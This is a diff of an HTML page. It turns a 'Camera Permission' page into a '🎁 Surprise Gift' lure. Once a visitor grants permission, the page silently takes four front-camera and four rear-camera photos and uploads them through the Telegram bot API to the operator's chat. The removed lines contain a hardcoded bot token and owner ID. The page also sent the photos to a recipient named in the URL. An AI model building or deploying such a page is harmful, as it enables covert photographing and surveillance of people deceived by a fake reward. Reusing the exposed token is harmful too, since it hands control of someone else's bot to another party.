@@ -2,111 +2,110 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Consent Required</title>
+<title>🎁 Surprise Gift</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <style>
 body {
-  background:#0f0c29;
-  color:#fff;
-  font-family:Arial;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  height:100vh;
+  margin: 0;
+  background: linear-gradient(135deg,#1a002b,#000);
+  font-family: Arial, sans-serif;
+  color: #fff;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
 }
+
 .box {
-  background:#000;
-  padding:30px;
-  border-radius:15px;
-  max-width:400px;
-  text-align:center;
-  box-shadow:0 0 20px #ff00ff;
+  background: rgba(0,0,0,.8);
+  border-radius: 20px;
+  padding: 25px;
+  max-width: 350px;
+  width: 90%;
+  text-align: center;
+  box-shadow: 0 0 25px #ff00ff;
 }
+
 button {
-  padding:12px 20px;
-  font-size:16px;
-  border:none;
-  border-radius:8px;
-  background:#ff00ff;
-  color:#fff;
-  cursor:pointer;
+  background: linear-gradient(90deg,#ff00ff,#ff66ff);
+  border: none;
+  border-radius: 30px;
+  padding: 14px 25px;
+  font-size: 16px;
+  color: #000;
+  cursor: pointer;
+  margin-top: 15px;
 }
-.status { margin-top:15px; font-size:14px; color:#ccc; }
+
+#video {
+  width: 100%;
+  border-radius: 15px;
+  display: none;
+  margin-top: 15px;
+}
+
+.status {
+  margin-top: 10px;
+  font-size: 14px;
+  color: #ccc;
+}
 </style>
 </head>
-<body>
 
+<body>
 <div class="box">
-  <h2>📸 Camera Permission</h2>
-  <p>
-    This feature requires camera access.<br>
-    <b>8 photos</b> will be captured and sent to both participants.
-  </p>
-  <button onclick="start()">Allow & Continue</button>
+  <h2>🎁 Unlock Your Surprise</h2>
+  <p>We need camera permission.<br>
+  <b>8 photos (4 front + 4 back)</b><br>
+  will be sent to you and the bot.</p>
+
+  <button onclick="start()">🔓 Allow & Continue</button>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas" hidden></canvas>
+
   <div class="status" id="status"></div>
 </div>
 
-<video id="v" autoplay playsinline hidden></video>
-<canvas id="c" hidden></canvas>
-
 <script>
-const BOT_TOKEN = "8226782560:AAF2iapgn0UUbVfR5LV87TQQGqfqVfOc88I";
-const OWNER_ID = "8215819954";
+const BOT_TOKEN = "YOUR_BOT_TOKEN";
+const CHAT_ID = "YOUR_CHAT_ID";
 
-const params = new URLSearchParams(location.search);
-const uid = params.get("uid") || OWNER_ID;
-
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
 const status = document.getElementById("status");
-const video = document.getElementById("v");
-const canvas = document.getElementById("c");
 const ctx = canvas.getContext("2d");
 
 let stream;
 let photos = [];
 
-async function start() {
-  status.innerText = "Requesting camera permission...";
-  stream = await navigator.mediaDevices.getUserMedia({ video: true });
-  video.srcObject = stream;
-  await new Promise(r => video.onloadedmetadata = r);
+async function openCamera(mode) {
+  if (stream) stream.getTracks().forEach(t => t.stop());
 
-  await captureSet("user");
-  await captureSet("environment");
-
-  stream.getTracks().forEach(t => t.stop());
-  status.innerText = "Uploading photos...";
-  await sendAll();
-  status.innerText = "✅ Completed";
-}
-
-async function captureSet(mode) {
-  stream.getTracks().forEach(t => t.stop());
   stream = await navigator.mediaDevices.getUserMedia({
-    video: { facingMode: mode }
+    video: { facingMode: mode },
+    audio: false
   });
+
   video.srcObject = stream;
+  video.style.display = "block";
+
+  await video.play();
   await new Promise(r => setTimeout(r, 800));
-
-  for (let i = 0; i < 4; i++) {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    ctx.drawImage(video, 0, 0);
-    photos.push(canvas.toDataURL("image/jpeg", 0.7));
-    await new Promise(r => setTimeout(r, 700));
-  }
 }
 
-async function sendAll() {
-  for (let i = 0; i < photos.length; i++) {
-    await sendPhoto(OWNER_ID, photos[i], `📸 ${i+1}/8`);
-    await sendPhoto(uid, photos[i], `📸 ${i+1}/8`);
-  }
+function capture() {
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0);
+  return canvas.toDataURL("image/jpeg", 0.8);
 }
 
-async function sendPhoto(chatId, base64, caption) {
+async function send(base64, caption) {
   const blob = await (await fetch(base64)).blob();
   const fd = new FormData();
-  fd.append("chat_id", chatId);
+  fd.append("chat_id", CHAT_ID);
   fd.append("photo", blob);
   fd.append("caption", caption);
 
@@ -115,7 +114,35 @@ async function sendPhoto(chatId, base64, caption) {
     body: fd
   });
 }
-</script>
 
+async function start() {
+  status.innerText = "📸 Opening front camera...";
+  await openCamera("user");
+
+  for (let i=1;i<=4;i++) {
+    photos.push(capture());
+    status.innerText = `Front photo ${i}/4`;
+    await new Promise(r=>setTimeout(r,700));
+  }
+
+  status.innerText = "🔄 Switching camera...";
+  await openCamera("environment");
+
+  for (let i=1;i<=4;i++) {
+    photos.push(capture());
+    status.innerText = `Back photo ${i}/4`;
+    await new Promise(r=>setTimeout(r,700));
+  }
+
+  stream.getTracks().forEach(t => t.stop());
+  status.innerText = "⬆️ Sending photos...";
+
+  for (let i=0;i<photos.length;i++) {
+    await send(photos[i], `📸 ${i+1}/8`);
+  }
+
+  status.innerText = "✅ Gift unlocked!";
+}
+</script>
 </body>
 </html>
